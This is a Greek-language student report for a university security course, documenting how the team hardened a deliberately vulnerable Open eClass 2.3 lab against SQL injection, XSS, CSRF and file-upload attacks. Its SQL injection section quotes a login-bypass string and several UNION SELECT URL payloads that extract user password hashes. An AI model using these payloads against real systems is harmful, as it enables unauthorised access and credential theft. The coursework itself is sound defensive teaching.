## Open eClass 2.3

Το repository αυτό περιέχει μια __παλιά και μη ασφαλή__ έκδοση του eclass.
Προορίζεται για χρήση στα πλαίσια του μαθήματος
[Προστασία & Ασφάλεια Υπολογιστικών Συστημάτων (ΥΣ13)](https://ys13.chatzi.org/), __μην τη
χρησιμοποιήσετε για κάνενα άλλο σκοπό__.


### Χρήση μέσω docker
```
# create and start (the first run takes time to build the image)
docker-compose up -d

# stop/restart
docker-compose stop
docker-compose start

# stop and remove
docker-compose down -v
```

To site είναι διαθέσιμο στο http://localhost:8001/. Την πρώτη φορά θα πρέπει να τρέξετε τον οδηγό εγκατάστασης.


### Ρυθμίσεις eclass

Στο οδηγό εγκατάστασης του eclass, χρησιμοποιήστε __οπωσδήποτε__ τις παρακάτω ρυθμίσεις:

- Ρυθμίσεις της MySQL
  - Εξυπηρέτης Βάσης Δεδομένων: `db`
  - Όνομα Χρήστη για τη Βάση Δεδομένων: `root`
  - Συνθηματικό για τη Βάση Δεδομένων: `1234`
- Ρυθμίσεις συστήματος
  - URL του Open eClass : `http://localhost:8001/` (προσοχή στο τελικό `/`)
  - Όνομα Χρήστη του Διαχειριστή : `drunkadmin`

Αν κάνετε κάποιο λάθος στις ρυθμίσεις, ή για οποιοδήποτε λόγο θέλετε να ρυθμίσετε
το openeclass από την αρχή, διαγράψτε το directory, `openeclass/config` και ο
οδηγός εγκατάστασης θα τρέξει ξανά.

## 2022 Project 1

Εκφώνηση: https://ys13.chatzi.org/assets/projects/project1.pdf


### Μέλη ομάδας

- Ιωάννης Καπετανγεώργης, 1115201800061 ([giannhskp](https://github.com/giannhskp))
- Δημήτριος Σιταράς, 1115201800178 ([sitaras](https://github.com/Sitaras))

# Report

# Table of contents
- [Defence](#defence)
  * [SQL Injection](#sql-injection)
  * [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
  * [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
  * [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
    + [Εργασίες](#εργασίες)
    + [Ανταλλαγή Αρχείων](#ανταλλαγή-αρχείων)
- [Attacks](#attacks)
  * [Στόχος 1: Εύρεση του κωδικού του admin όπως αυτός αποθηκεύεται στην βάση](#στόχος-1-εύρεση-του-κωδικού-του-admin-όπως-αυτός-αποθηκεύεται-στην-βάση)
  * [Στόχος 2: Deface](#στόχος-2-deface)
  * [SQL Injection](#sql-injection-1)
  * [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
    + [Μεταβλητή $\_SERVER['PHP_SELF']](#μεταβλητή-_serverphp_self)
    + [Περιοχή Συζητήσεων](#περιοχή-συζητήσεων)
    + [Εργασίες](#εργασίες-1)
    + [Ανακοινώσεις Διαχειριστή](#ανακοινώσεις-διαχειριστή)
    + [Lost Password](#lost-password)
    + [Αλλαγή προφίλ](#αλλαγή-προφίλ)
  * [Cross Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
    + [Διαγραφή χρήστη από ένα μάθημα](#διαγραφή-χρήστη-από-ένα-μάθημα)
    + [Δικαιώματα διαχειριστή μαθήματος](#δικαιώματα-διαχειριστή-μαθήματος)
    + [Διαγραφή τμήματος](#διαγραφή-τμήματος)
    + [Διαγραφή μαθήματος](#διαγραφή-μαθήματος)
    + [Διαγραφή χρήστη](#διαγραφή-χρήστη)
    + [Προσθήκη εξωτερικού σύνδεσμου στο αριστερό μενού](#προσθήκη-εξωτερικού-σύνδεσμου-στο-αριστερό-μενού)
  * [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi-1)
  * [Extra Attack](#extra-attack)

# Defence
Το site ήταν ευάλωτο σε όλα τα είδη των επιθέσεων σε πολλά σημεία. 
Προσπαθήσαμε να ασφαλίσουμε όλες τις σελίδες χωρίς να αφαιρέσουμε καμία λειτουργία της εφαρμογής κρατώντας ενεργές όλες τις λειτουργίες των χρηστών (όπως την αναζήτηση, το ημερολόγιo, την αλλαγή προφίλ, τα στατιστικά κ.α.) 
καθώς και όλες τις λειτουργίες του διαχειριστή (τόσο για την διαχείριση των μαθημάτων όσο και για την διαχείριση της εφαρμογής).
Η επιλογή μας να κρατήσουμε όλες τις λειτουργίες ενεργές και να προσπαθήσουμε να τις ασφαλίσουμε ενδεχομένως να μας κοστίσει στην φάση του web-war 
καθώς η πιθανότητα να μας "ξεφύγει" κάποιο σημείο αυξάνεται κατά πολύ. 
Ωστόσο επιλέξαμε να αφιερώσουμε όλο μας τον χρόνο στην ουσία του μαθήματος (δηλαδή στο να ασφαλίσουμε την εφαρμογή) 
και όχι στο να αφαιρούμε σελίδες από αυτήν.

Τα μόνα modules που απενεργοποιήσαμε ήταν τα επιπλέον εργαλεία των μαθημάτων (όπως Έγγραφα, Wiki, Video, Ασκήσεις κλπ.) καθώς όπως αναφέρθηκε η ενεργοποίηση των έξτρα λειτουργιών του μαθήματος και η επίθεση σε αυτές είναι εκτός του scope της εργασίας.

## SQL Injection

Για την προστασία από αυτού του είδους τα attacks χρησιμοποιήσαμε διάφορες τεχνικές ανάλογα την περίπτωση των ερωτημάτων. Πιο συγκεκριμένα, χρησιμοποιήσαμε:

- Prepared Statements μέσω της msqli. Χρησιμοποιήθηκε στις περισσότερες περιπτώσεις έτσι ώστε να επιτευχθεί η μέγιστη δυνατή ασφάλεια.

   - Συγκριμένα, μέσω της mysqli δημιουργούμε ένα connection (επιλέγοντας κάθε φορά το κατάλληλο table), σχηματίζουμε κάθε φορά το αντίστοιχο ερώτημα και κάνουμε στην συνέχεια bind στις αντίστοιχες μεταβλητές ξεχωριστά, αποτρέποντας οποιοδήποτε injection. Τέλος, εκτελούμε το ερώτημα κάνοντας execute() και αναλόγως με την πληροφορία που χρειάζεται στον μετέπειτα php κώδικα χρησιμοποιούμε συναρτήσεις της msqli προκειμένου να εξάγουμε οτιδήποτε είναι απαραίτητο. Έτσι, με τον τρόπο που περιγράφηκε αντικαταστήσαμε κάθε ευάλωτο σε injection query που δέχεται κατά βάση συμβολοσειρές ως παραμέτρους ( διότι στα queries που δέχονται απλά ακεραίους χρησιμοποιήσαμε την συνάρτηση intval(), αναλύεται παρακάτω).

- Την συνάρτηση intval() έτσι ώστε να φιλτράρουμε τις παραμέτρους. Χρησιμοποιήθηκε μόνο στις περιπτώσεις όπου οι παράμετροι ήταν μόνο ακέραιοι αριθμοί (π.χ. id), ένα χαρακτηριστικό παράδειγμα που χρησιμοποιήσαμε την intval() είναι οι παράμετροι των URLs, λόγου χάρη στο ακόλουθο link http://localhost:8001/modules/phpbb/viewtopic.php?topic=1&forum=1, για να φιλτράρουμε τις παραμέτρους topic και forum, διασφαλίζονται πως θα δέχονται μόνο ακεραίους και όχι οτιδήποτε άλλο που θα οδηγούσε σε injection, κάναμε χρήση της intval() (σε συνδιασμό βέβαια με την mysql_real_escape_string).

- Την συνάρτηση mysql_real_escape_string έτσι ώστε να φιλτράρουμε τις παραμέτρους. Χρησιμοποιήθηκε σε λίγες περιπτώσεις και σχεδόν πάντα σε συνδυασμό με μία από τις 2 παραπάνω τεχνικές, έτσι ώστε να αυξηθεί η προστασία.

Η παραπάνω τεχνικές εφαρμόστηκαν σε πάρα πολλά σημεία του κώδικα καθώς σχεδόν όλα τα ερωτήματα που γίνονταν στην βάση δεν είχαν καμία προστασία. Εφαρμόσαμε τις τεχνικές αυτές σε όλα τα ερωτήματα τα οποία περιείχαν κάποια παράμετρο η οποία προέρχεται από τον χρήστη (μέσω φόρμας, μέσω url, κ.ο.κ.). Επίσης εφαρμόστηκαν τόσο στις λειτουργίες των χρηστών όσο και στις λειτουργίες του διαχειριστή.

Κάποια από τα σημεία τα οποία διορθώσαμε τα κενά ασφαλείας είναι:
- Added Prepared Statements in function is_admin (openeclass/upgrade/upgrade_functions.php line 216) to prevent SQLI on http://localhost:8001/upgrade/index.php
- Μέσω της σελίδας /upgrade/index.php ο επιτιθέμενος μπορούσε να συνδεθεί σαν διαχειριστής κάνοντας ένα απλό SQL injection στην φόρμα του login, για παράδειγμα βάζοντας σαν username ' OR user.user_id='1' OR '1'='1 και αφήνοντας κενό τον κωδικό.
- Added Filtering at openeclass/modules/phpbb/viewtopic.php to prevent SQLI on http://localhost:8001/modules/phpbb/viewtopic.php?topic=1&forum=1 .
 	- Παράδειγμα SQLi: http://localhost:8001/modules/phpbb/viewtopic.php?topic=1000000%27%20union%20select%20password%20as%20topic_title,%201%20from%20eclass.user--%20&forum=1%27)--%20%27
- Added Filtering at openeclass/modules/phpbb/viewforum.php:
 	- To prevent SQLI on http://localhost:8001/modules/phpbb/viewforum.php?forum=1
 	- To prevent SQLI on http://localhost:8001/modules/phpbb/viewforum.php?forum=1&topicnotify=1&topic_id=1
- Added Prepared Statements in class-unreg to prevent SQLI attack on: http://localhost:8001/modules/unreguser/unregcours.php?cid=TMA100&u=2
 	- openeclass/include/lib/main.lib.php , function course_code_to_title
 	- openeclass/modules/unreguser/unregcours.php
 	- Παράδειγμα SQLi: http://localhost:8001/modules/unreguser/unregcours.php?u=2&cid=%27%20union%20select%20password%20%20from%20eclass.user%20where%20username=%22drunkadmin%22%27
- Added Filtering in user-unreg (openeclass/modules/unreguser/unreguser.php) to prevent SQLi on http://localhost:8001/modules/unreguser/unreguser.php?u=4&doit=yes
- Added Filtering in openeclass/modules/phpbb/index.php to prevent SQLi on http://localhost:8001/modules/phpbb/index.php
- Added Prepared Statements when creating a new topic (openeclass/modules/phpbb/newtopic.php) to prevent SQLi on http://localhost:8001/modules/phpbb/newtopic.php?forum=1 .
 	- Παράδειγμα SQLi: http://localhost:8001/modules/phpbb/newtopic.php?forum=1000000%27)%20union%20SELECT%20password%20as%20forum_name,%20password%20as%20forum_access,%20password%20as%20forum_type%20from%20eclass.user%20--%20%27
- Added Prepared Statements and Filtering when replying to a topic (openeclass/modules/phpbb/reply.php) to prevent SQLi on http://localhost:8001/modules/phpbb/reply.php?topic=1&forum=1
- Added Filtering to id parameter on openeclass/modules/work/work.php to prevent SQLi on http://localhost:8001/modules/work/work.php
- Added Prepared Statements on File Upload on Projects (openeclass/modules/work/work.php)
- Fixed all SQL injections on Dropbox page (openeclass/modules/dropbox/index.phpindex.php, dropbox_submit.php, dropbox_init1.inc.php)
- Fixed possible SQli attacks on course creation openeclass/modules/create_course/create_course.php (**Admin only**)
- Fixed possible SQli attacks on course edit openeclass/modules/course_info/infocours.php (**Admin only**)
- Added Prepared Statements on new user creation (openeclass/modules/auth/newuser.php)
- Added Prepared Statements on new user request (/modules/auth/newuserreq.php) (**Admin only**)
- Added Prepared Statements on /modules/admin/newuseradmin.php (**Admin only**)
- Added Filtering on new professor creation /modules/auth/newprof.php

## Cross-Site Scripting (XSS)

Το Cross-Site Scripting (XSS) επιτρέπει σε έναν κακόβουλο χρήστη να εισάγει κακόβουλο κώδικα (JavaScript) σε έναν web browser μέσω της χρήσης μιας ευπαθούς ιστοσελίδας. Ο κακόβουλος χρήστης μπορεί να ξεγελάσει έναν οποιονδήποτε χρήστη με σκοπό να κάνει κλικ σε ένα link (Reflected XSS) ή να επισκεφθεί μια σελίδα η οποία περιέχει ήδη τον κακόβουλο κώδικα (Stored ή Persistent XSS).


Υπάρχουν δύο βασικές κατηγορίες XSS επιθέσεων:

### Reflected XSS
Μία Reflected XSS επίθεση λαμβάνει χώρα όταν τα δεδομένα που υποβάλλονται από τον κακόβουλο χρήστη (μέσω του browser) χρησιμοποιούνται αμέσως από την πλευρά του browser. Mία τέτοια επίθεση πραγματοποιείται μέσω ενός φαινομενικά αθώου URL, το οποίο χρησιμοποιείται ως δόλωμα.

### Stored XSS
Τέτοιες ευπάθειες προκύπτουν όταν τα δεδομένα τα οποία στέλνονται από κάποιον κακόβουλο χρήστη αποθηκεύονται στον server, ώστε μετά να εμφανίζονται μέσα στις σελίδες του server όταν τις επισκέπτονται άλλοι χρήστες.


Εξ' αρχής δεν υπήρχε καμία προστασία για τις επιθέσεις αυτού του τύπου. Επομένως, προκειμένου να αμυνθούμε έναντι αυτών Χρησιμοποιήσαμε την βιβλιοθήκη 
htmlpurifier για να προστατέψουμε τις εισόδους από link που αποθηκεύονται στην PHP_SELF μεταβλητή του server αλλά και για τις μεταβλητές 
που προέρχονται από είσοδο (GET/POST) και τυπώνεται το περιεχόμενό τους στο site. 
Πιο συγκεκριμένα, σε οτιδήποτε κείμενο που εισάγεται σε φόρμες (πριν αποθηκευτεί στην βάση) χρησιμοποιήσαμε την htmlpurifier, 
ομοιώς και για τις παραμέτρους που περνιούνται μέσω του URL (στα \_GET[] kai \_POST[]). Ωστόσο, για την προστασία της μεταβλητής $\_SERVER[PHP_SELF] χρησιμοποιήσαμε την htmlspecialchars(), η οποία είναι συνάρτηση της php, 
αντικαθιστώντας σε όλα τα αρχεία οποιαδήποτε αναφορά στην $\_SERVER[PHP_SELF] με htmlspecialchars($\_SERVER[PHP_SELF]). 
Έτσι, αμυνθήκαμε απέναντι και στις 2 κατηγορίες XSS (Reflected και Stored), καταφέρνοντας κάθε φορά με την βοήθεια της βιβλιοθήκης να αφαιρέσουμε πιθανόν κακόβουλο κώδικα.
Μας βοήθησε αρκετά το link: https://blog.digital-craftsman.de/prevent-xss-through-html-sanitization-with-html-purifier/ .

Χρησιμοποιήσαμε την βιβλιοθήκη htmlpurifier στα παρακάτω php αρχεία:

- adminannouncements.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- edituser.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- newuseradmin.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- myagenda.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- ldapnewuser.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
- lostpass.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
- newprof.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- newuser.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
- newuserreq.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
- messageList.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- infocours.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- create_course.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- dropbox_submit.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
- forum_admin.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- editpost.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- newtopic.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- reply.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- profile.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- unregcours.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- adduser.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- work.php
  - purifier σε ό,τι κείμενο δέχεται η κάθε φόρμα, καθώς και σε κάθε μεταβλητή που περνιέται μέσω του URL.
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- baseTheme.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- fileManageLib.inc.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- learnPathLib.inc.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- main.lib.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- index.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- addfaculte.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- addusertocours.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- change_user.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- cleanup.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- delcours.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- eclassconf.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- listcours.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- listreq.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- listusers.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- mailtoprof.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- multireguser.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- password.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- stateclass.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- statuscours.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- common.inc.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- agenda.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- announcements.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- contactprof.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- courses.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- formuser.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- ldanewprofadmin.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- ldasearch_prof.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- ldasearch.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- edit.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- course_home.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- delete_course.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- restore_course.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- course_tools.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- learningPathAdmin.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- learningPathList.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- modules_pool.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- exercise.inc.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- scorm.inc.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- updateProgress.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- viewform.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- viewtopic.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- phpbb/index.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- units/index.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- insert_doc.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- unreguser.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- guestuser.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- muladduser.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- searchuser.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- user.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.
- upgrade.php
  - htmlspecialchars() στην PHP_SELF μεταβλητή.


## Cross-Site Request Forgery (CSRF)

Το CSRF είναι επίθεση που αναγκάζει τον τελικό χρήστη να εκτελέσει ανεπιθύμητες ενέργειες σε μια εφαρμογή δικτύου στην οποία είναι πιστοποιημένος (με απλά λόγια, συνδεδεμένος).
Στέλνοντας κάποιον σύνδεσμο (μέσω email/chat), ο κακόβουλος χρήστης μπορεί να ξεγελάσει τους χρήστες να εκτελέσουν ενέργειες που έχει επιλέξει. Έτσι, ένας χρήστης, ο οποίος έχει ταυτοποιηθεί μέσω ενός cookie που αποθηκεύεται στον browser του, θα μπορούσε εν αγνοία του να υποβάλλει ένα HTTP αίτημα σε έναν ιστότοπο που τον εμπιστεύεται.

Αυτό γίνεται εφικτό από τον τρόπο που λειτουργίας και εκτέλεσης των αιτημάτων των χρηστών.
Εξ' αρχής δεν υπήρχε καμία προστασία για τις επιθέσεις αυτού του τύπου.
Επομένως, προκειμένου να αμυνθούμε έναντι αυτών βάλαμε σε κάθε post και get request ( που κάνει αλλαγή στο site ) ένα token μήκους 32 χαρακτήρων το οποίο παράγεται κάθε φορά τυχαία με χρήση των συναρτήσεων bin2hex(), openssl_random_pseudo_bytes(). Όταν το token που σταλθεί δεν είναι το σωστό, "πετάμε" error και τερματίζουμε το php script της σελίδας, στης οποίας γίνεται η προσπάθεια να σταλθεί το request, με exit(), χωρίς να επιτρέπουμε βέβαια να γίνει αποδεκτό το αντίστοιχο request.
Σημειώνουμε, πως το token αυτό προστέθηκε στις φόρμες ως hidden αντικείμενο (το οποίο λαμβάνεται μετά μέσω _POST για τον αντίστοιχο έλεγχο) και στα get requests προστέθηκε μια επιπλέον μεταβλητή με &, συνήθως την ονομάζαμε token (η οποία λαμβάνεται μετά μέσω _GET για τον αντίστοιχο έλεγχο).
Έτσι, τελικά, με την χρήση αυτού του token αποτρέπουμε κάθε κακόβουλο χρήστη να πραγματοποιήσει csrf attack.


Τέλος, token βάλαμε στα παρακάτω php αρχεία:

- profile.php
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- admin/password.php 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- profile/password.php 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- newtopic.php
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- relpy.php 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- messages.php
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- course edit,delete 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- admin/edituser.php 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- admin/adminannouncements.php 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- admin/unreguser.php 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
  - το token προστέθηκε με & στο get request.
- unreguser/unreguser.php 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- admin/password.php 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- profile/password.php 
  - το token προστέθηκε ως hidden αντικέιμενο στην αντίστοιχη φόρμα.
- work/work.php (edit,remove,public/private,grades)
  - το token προστέθηκε ως hidden αντικέιμενο στις  αντίστοιχες φόρμες.
  - το token προστέθηκε με & στα get requests.
- units/info.php (add unit)
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
- course_home/course_home.php
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
  - το token προστέθηκε με & στα get requests.
- modules/user/user.php 
  - το token προστέθηκε με & στα get requests.
- admin/addfaculte.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
  - το token προστέθηκε με & στα get requests.
- admin/delcours.php 
  - το token προστέθηκε με & στα get requests.
- admin/change_user.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- admin/multireguser.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- course_info/restore_cource.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- admin/addusertocours.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- admin/cleanup.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- admin/eclassconf.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- admin/infocours.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- course_info/infocours.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- admin/listreq.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- admin/mailtoprof.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- admin/newuseradmin.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- admin/statuscours.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- user/muladduser.php
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες
- user/searchuser.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
  - το token προστέθηκε με & στα get requests.
- course_tools/course_tools.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
  - το token προστέθηκε με & στα get requests.
- contact/index.php
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
- contact/index.php
  - το token προστέθηκε με & στα get requests.
- forum_admin/forum_admin.php
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
  - το token προστέθηκε με & στα get requests.
- import/import.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
- auth/newuser.php 
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
- auth/lostpass.php
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
- phpbb/editpost.php
  - το token προστέθηκε ως hidden αντικέιμενο στις αντίστοιχες φόρμες.
- phpbb/viewtopic.php
  - το token προστέθηκε με & στα get requests.
- unregister/unregcours.php 
  - το token προστέθηκε με & στα get requests.
- include/logged_out_content.php 
  - το token προστέθηκε με & στα get requests.

## Remote File Inclusion (RFI)

Τα δύο βασικά modules μέσω των οποίων μπορούσαν να ανέβουν αρχεία τα οποία αποθηκεύονταν στον server είναι οι "Εργασίες" και οι "Ανταλλαγή Αρχείων".
Έτσι στα modules αυτά προσθέσαμε κάποια μέτρα ασφαλείας έτσι ώστε σε καμία περίπτωση τα αρχεία αυτά να μην μπορούν να εκτελεστούν και κατ' επέκταση να επιτευχθεί RFI attack. Ενδεχομένως, τα μέτρα που λάβαμε να είναι υπέρ-αρκετά και να μην χρειάζονται όλα, ωστόσο θέλαμε να είμαστε σίγουροι πως θα είμαστε ασφαλείς καθώς τα RFI attacks είναι τα πιο "επικίνδυνα" από τις 4 κατηγορίες attacks. Στην συνέχεια αναφέρουμε τα μέτρα ασφαλείας που εφαρμόσαμε για κάθε ένα από τα δύο modules.

### Εργασίες
- Για κάθε μία εργασία δημιουργείται ένας κατάλογος στο file system μέσα στον οποίο αποθηκεύονται οι εργασίες που έχουν υποβληθεί. Το όνομα αυτό περιείχε ένα μικρό στοιχείο τυχαιότητας, ωστόσο ήταν κυρίως βασισμένο στην ώρα δημιουργίας του directory. Έτσι προσθέσαμε ένα τελείως τυχαίο όνομα για τους φακέλους που δημιουργούνται το οποίο σε καμία περίπτωση δεν μπορεί να "μαντευθεί" αλλά ούτε και να γίνει brute force.
- Σε όλους τους φακέλους που δημιουργούνται εντός του καταλόγου /courses/, προσθέσαμε άδεια αρχεία με όνομα index.php έτσι ώστε να μην μπορούν να προβληθούν τα περιεχόμενα ενός φακέλου (κάτι που συνέβαινε πριν την προσθήκη των index.php αρχείων).
- Στα ονόματα των αρχείων (όπως αυτά αποθηκεύονται στον server) έχει προστεθεί ένα εντελώς τυχαίο κλειδί. Έτσι το όνομα ενός αρχείου είναι αδύνατο να βρεθεί.
- Όλα τα αρχεία μετατρέπονται σε text files (.txt) έτσι ώστε να μην μπορούν να εκτελεστούν. Όταν ο administrator κατεβάζει τα αρχεία τότε αυτά επανέρχονται στο αρχικό τους format.
